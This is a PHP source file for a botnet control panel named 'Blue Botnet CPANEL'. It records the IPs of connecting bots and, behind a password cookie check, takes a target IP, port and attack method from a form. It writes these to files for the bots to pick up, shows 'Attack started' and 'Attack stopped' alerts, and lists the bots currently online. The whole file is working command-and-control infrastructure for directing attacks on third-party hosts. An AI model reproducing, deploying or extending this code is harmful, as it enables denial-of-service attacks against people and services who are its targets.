<?php
				$dataFile = "visitors.txt";

				$sessionTime = 5; //this is the time in **minutes** to consider someone online before removing them from our file

				//Please do not edit bellow this line

				error_reporting(E_ERROR | E_PARSE);

				if(!file_exists($dataFile)) {
					$fp = fopen($dataFile, "w+");
					fclose($fp);
				}

				$ip = $_SERVER['REMOTE_ADDR'];
				$users = array();
				$onusers = array();

				//getting
				$fp = fopen($dataFile, "r");
				flock($fp, LOCK_SH);
				while(!feof($fp)) {
					$users[] = rtrim(fgets($fp, 32));
				}
				flock($fp, LOCK_UN);
				fclose($fp);


				//cleaning
				$x = 0;
				$alreadyIn = FALSE;
				foreach($users as $key => $data) {
					list( , $lastvisit) = explode("|", $data);
					if(time() - $lastvisit >= $sessionTime * 60) {
						$users[$x] = "";
					} else {
						if(strpos($data, $ip) !== FALSE) {
							$alreadyIn = TRUE;
							$users[$x] = "$ip|" . time(); //updating
						}
					}
					$x++;
				}

				//writing
				$fp = fopen($dataFile, "w+");
				flock($fp, LOCK_EX);
				$i = 0;
				foreach($users as $single) {
					if($single != "") {
						fwrite($fp, $single . "\r\n");
						$i++;
					}
				}
				flock($fp, LOCK_UN);
				fclose($fp);

				if($uo_keepquiet != TRUE) {
					//echo $i;
				}
			?>
<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" ><![endif]-->
<!--[if gt IE 8]><!--><html class="no-js" ><!--<![endif]-->
<html>
 <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Blue Botnet CPANEL</title>
  <!-- Fogli di stile -->
  <link href="css/bootstrap.css" rel="stylesheet" media="screen">
  <link href="css/stili-custom.css" rel="stylesheet" media="screen">
  <!-- Modernizr -->
  <script src="js/modernizr.custom.js"></script>
  <style>
  body {background-color:#C4D5E5;}
  .tce {
	margin-left: auto !important;
    margin-right: auto !important;
	width:520px !important;
	max-width:520px !important;
  }

  </style>
  <!-- respond.js per IE8 -->
  <!--[if lt IE 9]>
  <script src="js/respond.min.js"></script>
  <![endif]-->
 </head>
 <body bgcolor="#C4D5E5">
<!--<center>-->
<br>
<div class="tce"><br>
<?php

if (!file_exists("phash")){
	header("Location: register.php");
}

$filename = "phash";
$fp = fopen($filename, "r");
$content = fread($fp, filesize($filename));
fclose($fp);
$storedPassHash = $content;
$passHash = $_COOKIE['phash'];
if (md5("randomsalt".$passHash) != $storedPassHash){
	header("Location: login.php");
}

$ip = $_POST['ipaddress'];
$port = $_POST['port'];
$method = $_POST['method'];

if ($ip == "STOP")
	$method = "STOP";

if ($ip == "")
	$ip = $_GET['ipaddress'];
if ($port == "")
	$port = $_GET['port'];
if ($method == "")
	$method = $_GET['method'];

if ($ip != ""){
	$fh = fopen("target.ip", 'w+');
	fwrite($fh, $ip);
	fclose($fh);
	$fh = fopen("target.port", 'w+');
	fwrite($fh, $port);
	fclose($fh);
	$fh = fopen("target.method", 'w+');
	fwrite($fh, $method);
	fclose($fh);
	if ($method != "STOP")
		echo '<div class="alert alert-success alert-dismissable">		<button type="button" class="close" data-dismiss="alert">&times;</button>		Attack started	</div>	';
	else
		echo '<div class="alert alert-danger alert-dismissable">		<button type="button" class="close" data-dismiss="alert">&times;</button>		Attack stopped	</div>	';
}
?>
	<div class="panel panel-default">
 <div class="panel-heading">
  <h3 class="panel-title">Blue Botnet CPANEL</h3>
 </div>
 <div class="panel-body">
 <form action="index.php" method="post">
	<ul class="nav nav-pills">
	 <li><a href="index.php">Attack Hub</a></li>
	 <li><a href="settings.php">Settings</a></li>
	 <li class="active"><a href="#">Online Bots</a></li>
	 <li><a href="logout.php">Logout</a></li>
	</ul><br><br>
<table class="table table-bordered">
  <thead>
    <tr>
      <th>ID</th>
      <th>IP</th>
    </tr>
  </thead>
  <tbody>
      <?php
		$filename = "visitors.txt";
		if ( 0 == filesize( $filename ) )
		{
			echo "<b>No bots D:</b><br><br>";
		} else {
			$fp = fopen($filename, "r");
			$content = fread($fp, filesize($filename));
			fclose($fp);
			$bots = explode("\n", $content);
			for ($i=0; $i<count($bots) - 1; $i++){
				echo "<tr><td>".$i."</td>";
				$bp = explode('|', $bots[$i]);
				echo "<td>".$bp[0]."</td></tr>";
			}
		}
	  ?>
  </tbody>
</table>
 </div>
</div>
</div>
<!--</center>-->
 <br>
 <!-- jQuery e plugin JavaScript  -->
 <script src="http://code.jquery.com/jquery.js"></script>
 <script src="js/bootstrap.min.js"></script>
 </body>
</html>